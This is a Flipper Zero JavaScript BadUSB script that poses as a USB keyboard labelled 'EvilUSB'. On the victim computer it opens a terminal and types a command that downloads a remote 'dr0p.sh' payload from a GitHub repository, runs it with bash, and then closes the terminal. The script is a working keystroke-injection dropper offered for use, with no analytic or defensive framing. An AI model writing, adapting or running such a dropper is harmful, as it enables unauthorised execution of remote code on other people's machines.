let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let eventLoop = require("event_loop");
let gui = require("gui");
let dialog = require("gui/dialog");

let views = {
    dialog: dialog.makeWith({
        header: "BadUSB Test",
        text: "Press OK to start",
        center: "Start",
    }),
};

badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfrName: "EvilUSB",
    prodName: "Flip0",
    layoutPath: "/ext/badusb/assets/layouts/en-US.kl"
});

eventLoop.subscribe(views.dialog.input, function (_sub, button, eventLoop, gui) {
    if (button !== "center")
        return;

    gui.viewDispatcher.sendTo("back");

    if (badusb.isConnected()) {
        notify.blink("green", "short");
        print("USB is connected");

        badusb.press("ALT", "t"); //Open terminal
        delay(1000);
        
        // Download/execute a remote Python or Bash file
        badusb.println("curl -o /tmp/dr0p.sh https://raw.githubusercontent.com/PradaGangMafia/FlipDikz/refs/heads/main/Payloads/dr0p.sh && bash /tmp/dr0p.sh");
        delay(1000);
        

        
        badusb.println("exit");
        delay(1000);
        badusb.press("ENTER");

        notify.success();
    } else {
        print("USB not connected");
        notify.error();
    }

    // Optional, but allows to unlock usb interface to switch profile
    badusb.quit();

    eventLoop.stop();
}, eventLoop, gui);

eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _item, eventLoop) {
    eventLoop.stop();
}, eventLoop);

gui.viewDispatcher.switchTo(views.dialog);
eventLoop.run();
